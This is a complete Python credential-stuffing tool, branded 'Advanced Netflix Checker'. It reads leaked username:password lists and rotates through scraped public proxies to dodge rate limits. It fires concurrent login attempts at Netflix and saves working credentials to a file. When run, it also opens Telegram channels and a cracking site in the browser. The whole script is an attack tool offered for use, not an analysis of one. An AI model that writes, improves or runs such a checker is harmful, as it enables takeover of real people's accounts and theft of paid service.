import requests
import os
import threading
import random
import time
import sys
import re
import concurrent.futures
from requests.adapters import HTTPAdapter

# Global variables
success_count = 0
success_lock = threading.Lock()
proxies_list = []
proxies_lock = threading.Lock()
checked_accounts = 0
total_accounts = 0

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.netflix.com',
    'Referer': 'https://www.netflix.com/login',
    'Upgrade-Insecure-Requests': '1'
}

def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = """
\033[1;91m
 ██████╗██╗  ██╗ ██████╗ ██╗    ██╗██████╗ ██╗   ██╗██████╗ ██████╗ ██╗   ██╗
██╔════╝██║  ██║██╔═══██╗██║    ██║██╔══██╗██║   ██║██╔══██╗██╔══██╗╚██╗ ██╔╝
██║     ███████║██║   ██║██║ █╗ ██║██████╔╝██║   ██║██████╔╝██████╔╝ ╚████╔╝ 
██║     ██╔══██║██║   ██║██║███╗██║██╔══██╗██║   ██║██╔══██╗██╔══██╗  ╚██╔╝  
╚██████╗██║  ██║╚██████╔╝╚███╔███╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   
 ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                                              
\033[1;92m
██████╗ ██████╗  █████╗ ███╗   ██╗██████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗
██████╔╝██║  ██║███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║█████╗  ██████╔╝
██╔══██╗██║  ██║██╔══██║██║╚██╗██║██║  ██║██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
██████╔╝██████╔╝██║  ██║██║ ╚████║██████╔╝██║  ██║ ╚████╔╝ ███████╗██║  ██║
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
                                                                            
\033[1;96m
+---------------------------------------------------+
|           ADVANCED NETFLIX CHECKER               |
|              Created by: chowdhuryvai            |
|                Version: 7.0 PRO                  |
+---------------------------------------------------+
\033[0m
"""
    print(banner)

def open_info_links():
    """Open information links in browser"""
    try:
        import webbrowser
        links = [
            "https://t.me/darkvaiadmin",
            "https://t.me/windowspremiumkey", 
            "https://crackyworld.com/"
        ]
        print(f"\033[1;93m📢 Opening information links...\033[0m")
        for link in links:
            webbrowser.open(link)
    except:
        pass

def get_proxy_option():
    """Let user choose proxy method"""
    print(f"\n\033[1;94m🔧 PROXY CONFIGURATION\033[0m")
    print(f"\033[1;93m1. Auto - Scrape proxies from internet (Recommended)")
    print(f"2. Manual - Upload your own proxy file")
    print(f"3. No Proxy - Use direct connection (Slow)\033[0m")
    
    while True:
        choice = input(f"\n\033[1;96mSelect option (1/2/3): \033[0m").strip()
        if choice in ['1', '2', '3']:
            return choice
        print(f"\033[91m❌ Invalid choice! Please enter 1, 2, or 3\033[0m")

def scrape_auto_proxies():
    """Scrape proxies automatically from multiple sources"""
    print(f"\033[1;94m🔄 Scraping proxies from internet...\033[0m")
    
    proxy_sources = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://api.openproxylist.xyz/http.txt",
    ]
    
    all_proxies = []
    
    def fetch_from_source(source):
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                proxies = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', response.text)
                return proxies
        except:
            return []
        return []
    
    # Fast parallel scraping
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(fetch_from_source, proxy_sources))
    
    for result in results:
        all_proxies.extend(result)
    
    # Remove duplicates
    all_proxies = list(set(all_proxies))
    print(f"\033[1;92m📥 Found {len(all_proxies)} proxies online\033[0m")
    
    # Fast testing
    print(f"\033[1;93m⚡ Testing proxies...\033[0m")
    working_proxies = []
    
    def test_proxy(proxy):
        try:
            test_url = "http://httpbin.org/ip"
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            response = requests.get(test_url, proxies=proxies, timeout=5, verify=False)
            if response.status_code == 200:
                return proxy
        except:
            return None
    
    # Test with high concurrency
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        results = list(executor.map(test_proxy, all_proxies))
    
    working_proxies = [p for p in results if p is not None]
    
    print(f"\033[1;92m✅ Working proxies: {len(working_proxies)}\033[0m")
    return working_proxies

def load_manual_proxies():
    """Load proxies from user file"""
    print(f"\n\033[1;93m📁 Enter your proxy file path: \033[0m", end="")
    proxy_file = input().strip()
    
    if not os.path.exists(proxy_file):
        print(f"\033[91m❌ Proxy file not found!\033[0m")
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        # Validate proxy format
        valid_proxies = []
        for proxy in proxies:
            if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}', proxy):
                valid_proxies.append(proxy)
        
        print(f"\033[1;92m📥 Loaded {len(valid_proxies)} proxies from file\033[0m")
        
        # Test loaded proxies
        print(f"\033[1;93m🔍 Testing loaded proxies...\033[0m")
        working_proxies = []
        
        def test_manual_proxy(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                proxies_config = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                response = requests.get(test_url, proxies=proxies_config, timeout=5, verify=False)
                if response.status_code == 200:
                    return proxy
            except:
                return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            results = list(executor.map(test_manual_proxy, valid_proxies))
        
        working_proxies = [p for p in results if p is not None]
        
        print(f"\033[1;92m✅ Working proxies: {len(working_proxies)}\033[0m")
        return working_proxies
        
    except Exception as e:
        print(f"\033[91m❌ Error reading proxy file: {e}\033[0m")
        return []

def setup_proxies():
    """Setup proxies based on user choice"""
    global proxies_list
    
    choice = get_proxy_option()
    
    if choice == '1':
        # Auto proxy scraping
        proxies = scrape_auto_proxies()
    elif choice == '2':
        # Manual proxy upload
        proxies = load_manual_proxies()
    else:
        # No proxy
        proxies = []
        print(f"\033[1;93m⚠️  Using direct connection (No proxy)\033[0m")
    
    with proxies_lock:
        proxies_list = proxies
    
    return proxies

def get_random_proxy():
    """Get a random proxy from the list"""
    with proxies_lock:
        if not proxies_list:
            return None
        return random.choice(proxies_list)

def create_optimized_session():
    """Create optimized session for speed"""
    session = requests.Session()
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=1)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def check_netflix_account(line):
    """Check Netflix account with optimized speed"""
    global success_count, checked_accounts
    
    username = ""
    try:
        username, password = line.strip().split(":", 1)
        username = username.strip()
        password = password.strip()
        
        if not username or not password:
            return
        
        # Try with 2 different proxies max for speed
        for attempt in range(2):
            proxy = get_random_proxy()
            
            try:
                proxies_config = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
                session = create_optimized_session()
                session.headers.update(headers)
                
                # Fast login attempt
                login_data = {
                    'userLoginId': username,
                    'password': password,
                    'rememberMe': 'true',
                }
                
                response = session.post(
                    "https://www.netflix.com/login", 
                    data=login_data, 
                    proxies=proxies_config, 
                    timeout=10,
                    allow_redirects=True,
                    verify=False
                )
                
                # Fast success detection
                if response.status_code in [200, 302]:
                    success_indicators = [
                        '/browse' in response.url,
                        'profilesGate' in response.url,
                        'profiles' in response.url,
                        'memberHome' in response.url,
                        'Who\'s Watching' in response.text
                    ]
                    
                    error_indicators = [
                        'Incorrect password' in response.text,
                        'Sorry, we can\'t find an account' in response.text
                    ]
                    
                    if any(success_indicators) and not any(error_indicators):
                        print(f"\033[92m[VALID] ✓ {username}:{password}\033[0m")
                        with open("netflix_valid.txt", "a", encoding='utf-8') as file:
                            file.write(f"{username}:{password}\n")
                        with success_lock:
                            success_count += 1
                        return
                
                # Fast error detection
                if 'Incorrect password' in response.text:
                    print(f"\033[91m[WRONG PASS] ✗ {username}\033[0m")
                    return
                elif 'Sorry, we can\'t find an account' in response.text:
                    print(f"\033[91m[INVALID EMAIL] ✗ {username}\033[0m")
                    return
                    
            except requests.exceptions.ConnectTimeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except requests.exceptions.ProxyError:
                continue
            except Exception:
                continue
        
        print(f"\033[91m[FAILED] ✗ {username}\033[0m")
            
    except ValueError:
        print(f"\033[93m[BAD FORMAT] {line}\033[0m")
    except Exception:
        print(f"\033[93m[ERROR] {username}\033[0m")
    finally:
        with success_lock:
            checked_accounts += 1
        
        # Show progress every 5 accounts
        if checked_accounts % 5 == 0:
            progress = (checked_accounts / total_accounts) * 100
            print(f"\033[1;94m📊 Progress: {checked_accounts}/{total_accounts} ({progress:.1f}%) | Valid: {success_count}\033[0m")

def load_accounts_file():
    """Load accounts from user file"""
    print(f"\n\033[1;93m📁 Enter your accounts file path: \033[0m", end="")
    file_path = input().strip()
    
    if not os.path.exists(file_path):
        print(f"\033[91m❌ File not found!\033[0m")
        return None
    
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = [line.strip() for line in file if line.strip() and ':' in line]
        
        if not lines:
            print(f"\033[91m❌ No valid accounts found in file!\033[0m")
            return None
        
        print(f"\033[1;92m✅ Loaded {len(lines)} accounts from file\033[0m")
        return lines
        
    except Exception as e:
        print(f"\033[91m❌ Error reading file: {e}\033[0m")
        return None

def main():
    display_banner()
    
    print("\033[1;94m" + "="*60)
    print("🔗 Contact Information:")
    print("📱 Telegram ID: https://t.me/darkvaiadmin")
    print("📢 Telegram Channel: https://t.me/windowspremiumkey")
    print("🌐 Website: https://crackyworld.com/")
    print("="*60 + "\033[0m")
    
    open_info_links()
    time.sleep(1)
    
    # Setup proxies
    start_time = time.time()
    proxies = setup_proxies()
    proxy_time = time.time() - start_time
    
    if proxies:
        print(f"\033[1;92m⏱️  Proxy setup time: {proxy_time:.2f}s\033[0m")
    else:
        print(f"\033[1;93m⚠️  No proxies available, using direct connection\033[0m")
        with proxies_lock:
            proxies_list = [None]
    
    # Load accounts
    accounts = load_accounts_file()
    if not accounts:
        return
    
    global total_accounts
    total_accounts = len(accounts)
    
    print(f"\n\033[1;95m🚀 Starting advanced checking for {total_accounts} accounts...\033[0m")
    if proxies:
        print(f"\033[1;92m🛡️  Using {len(proxies)} proxies for rotation\033[0m")
    print("\033[1;90m" + "-" * 60 + "\033[0m")

    # Clear previous results
    if os.path.exists("netflix_valid.txt"):
        os.remove("netflix_valid.txt")

    # Calculate optimal thread count
    max_workers = min(50, total_accounts, (len(proxies) if proxies else 1) * 10)
    print(f"\033[1;96m⚡ Starting with {max_workers} concurrent threads\033[0m\n")
    
    time.sleep(2)
    
    # Start checking
    check_start = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks
        futures = [executor.submit(check_netflix_account, account) for account in accounts]
        
        # Wait for completion
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception:
                continue

    total_time = time.time() - check_start
    speed = total_accounts / total_time if total_time > 0 else 0
    
    # Final results
    print("\n\033[1;95m" + "="*50)
    print("🎉 CHECKING COMPLETED!")
    print("="*50)
    print(f"\033[92m✅ Valid Accounts: {success_count}\033[0m")
    print(f"\033[91m❌ Invalid Accounts: {total_accounts - success_count}\033[0m")
    print(f"\033[94m📊 Total Checked: {total_accounts}\033[0m")
    print(f"\033[93m⏱️  Total Time: {total_time:.2f}s\033[0m")
    print(f"\033[96m⚡ Speed: {speed:.1f} accounts/second\033[0m")
    
    if success_count > 0:
        print(f"\033[92m💾 Valid accounts saved to: netflix_valid.txt\033[0m")
    
    print("\033[1;95m" + "="*50)
    print("💡 Created by: chowdhuryvai")
    print("🌐 Visit: https://crackyworld.com/")
    print("="*50 + "\033[0m")

if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Set socket timeout for better performance
    import socket
    socket.setdefaulttimeout(10)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\033[1;91m⏹️  Process interrupted by user\033[0m")
    except Exception as e:
        print(f"\n\033[1;91m💥 Unexpected error: {e}\033[0m")
